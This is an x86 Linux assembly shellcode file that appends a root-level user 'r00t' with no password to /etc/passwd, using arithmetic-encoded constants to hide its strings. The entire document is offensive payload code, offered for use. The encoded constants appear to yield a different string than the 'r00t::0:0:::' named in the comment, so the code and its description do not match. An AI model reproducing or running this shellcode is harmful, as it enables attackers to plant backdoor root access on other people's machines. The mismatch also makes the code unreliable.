; By Lucas Kauffman
; 100 byte shellcode to add root user 'r00t' with no password to /etc/passwd for Linux/x86
; 
; Original by Kris Katterjohn 11/14/2006
 
 
  section .text
 
       global _start
 
  _start:
 
  ; open("/etc//passwd", O_WRONLY | O_APPEND)
       xor ebx,ebx
       mul ebx
       mov al,5
       mov ecx,ebx
       push ecx
       mov dword [esp-4], 0x64777373
       mov dword [esp-8], 0x61702f2f
       mov dword [esp-12],0x6374652f
       sub esp,12
       mov ebx, esp
       mov cx, 401
       int 0x80
 
       mov ebx, eax
 
  ; write(ebx, "r00t::0:0:::", 12)
 
       mov al,4
       push edx
       mov esi, 0x20202020
       add esi, 0x11111111
       push esi
       mov esi, 0x20202020
       add esi, 0x11111111
       push esi
       mov esi, 0x63202061
       add esi, 0x11101011
       push esi
       mov ecx, esp
       push byte 12
       pop edx
       int 0x80
 
  ; close(ebx)
 
       mov al,6
       int 0x80
 
  ; exit()
 
       mov al,1
       int 0x80
